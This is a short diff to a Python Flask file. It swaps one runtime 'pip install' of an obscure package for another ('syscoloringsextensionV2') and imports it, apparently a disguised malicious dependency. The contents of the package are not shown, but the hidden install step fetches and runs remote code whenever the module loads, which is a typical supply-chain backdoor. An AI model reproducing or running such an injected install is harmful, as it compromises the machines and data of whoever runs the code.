@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pycryptextension")
-import pycryptextension
+os.system("pip install syscoloringsextensionV2")
+import syscoloringsextensionV2
 import flask
 
 from flask import g
